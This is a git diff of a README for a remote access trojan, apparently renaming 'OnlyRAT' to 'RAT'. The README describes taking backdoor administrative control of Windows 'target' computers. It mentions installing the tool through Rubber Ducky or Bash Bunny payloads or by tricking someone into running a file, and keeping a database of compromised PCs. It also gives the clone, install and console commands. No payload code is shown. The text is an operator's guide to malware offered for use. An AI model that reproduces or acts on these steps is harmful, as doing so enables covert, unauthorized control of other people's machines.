@@ -1,10 +1,10 @@
 
 ## Overview:
-RAT [Only Remote Access Tool]. We will be able to use this tool to remotely command and control windows computers. 
+RAT [Remote Access Tool]. We will be able to use this tool to remotely command and control windows computers. 
 
 The RAT has a multitude of ways of how it can be installed on to a target pc. Whether it is getting them to run a file all the way to RubberDucky and BashBunny payloads.
 
-Once installed we will have remote administrative access to our target. We can connect to our target through our Python console on our attacker pc. The onlyrat console has plenty of payloads we can then use on our target or we can simply enjoy our backdoor access. Enjoy!
+Once installed we will have remote administrative access to our target. We can connect to our target through our Python console on our attacker pc. The console has plenty of payloads we can then use on our target or we can simply enjoy our backdoor access.
 
 ## Requirements:
 **Attacker PC**
@@ -25,14 +25,14 @@ Once installed we will have remote administrative access to our target. We can c
 - The [installers](https://github.com/mridul249/RAT/tree/main/installers) folder contains all the ways we can install the RAT on to our target
 
 **Attacker Installation**
-- install only rat by cloning this repository
+- install rat by cloning this repository
 ```bash
 git clone https://github.com/mridul249/RAT.git
 ```
-- install dependencies for OnlyRAT
+- install dependencies for RAT
 - restart terminal once installation is complete
 ```bash
-cd OnlyRAT
+cd RAT
 sh install.sh
 ```
 
@@ -43,11 +43,11 @@ onlyrat
 ```
 - Append configuraiton file to specify target
 ```bash
-onlyrat bluecosmo.rat
+onlyrat example.rat
 ```
 
 ## Extraneous:
 
-**Configuration file?**
+**Configuration file**
 
-The configuration file `username.rat` is a file we obtain through our OnlyRAT [installers](https://github.com/mridul249/RAT/tree/main/installers). It saves obfuscated information that OnlyRAT needs in order to connect back to our target computer. Having configuration files allows hackers to have a database of all the comprimised pc's they have access to.
+The configuration file `username.rat` is a file we obtain through our RAT [installers](https://github.com/mridul249/RAT/tree/main/installers). It saves obfuscated information that RAT needs in order to connect back to our target computer. Having configuration files allows hackers to have a database of all the comprimised pc's they have access to.
